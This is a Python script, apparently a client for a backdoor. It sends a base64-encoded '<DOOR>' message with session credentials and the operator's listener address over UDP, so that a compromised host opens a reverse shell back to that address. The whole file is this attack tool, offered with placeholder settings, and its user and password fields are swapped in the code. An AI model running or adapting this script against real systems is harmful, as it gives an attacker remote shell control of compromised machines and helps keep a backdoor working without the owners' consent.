import base64
import socket
import time

class ReverseShell:
    def __init__(self, 
            lhost:str,
            lport:int,
            rhost:str,
            rport:int,
            session_user:str,
            session_pass:str):
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
        self.session_pass = session_pass
        self.session_user = session_user
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def encode_base64(self, target:str) -> str:
        return base64.b64encode(str(target).encode())

    def decode_base64(self, target:str) ->str:
        return base64.b64decode(target).decode()
    
    def run(self):
        
        payload = "<DOOR><PASS>{Pass}</PASS><USER>{user}</USER><HOST>{lhost}</HOST><PORT>{lport}</PORT></DOOR>".format(
                Pass = self.session_user,
                user = self.session_pass,
                lhost = self.lhost,
                lport = self.lport)
        
        self.sock.sendto(self.encode_base64(payload),(self.rhost, self.rport))
        
        # time for timeout is 4sec.
        self.sock.settimeout(4);
        try:
            r= self.sock.recv(1024)
            print("#",self.decode_base64(r))

        except Exception as e:
            print("#{}\nrport may not be set correctly".format(e))
            
        self.sock.close()
         

if __name__ == "__main__":
    
    session = ReverseShell(
            lhost = "127.0.0.1",    # your ip address
            lport = 4444,           # your opne port
            rhost = "127.0.0.1",    # target host 
            rport = 41333,          # target setting port 
            session_pass= "admin",  # target door session password
            session_user = "admin"  # target door session user 
            )
    
    session.run()


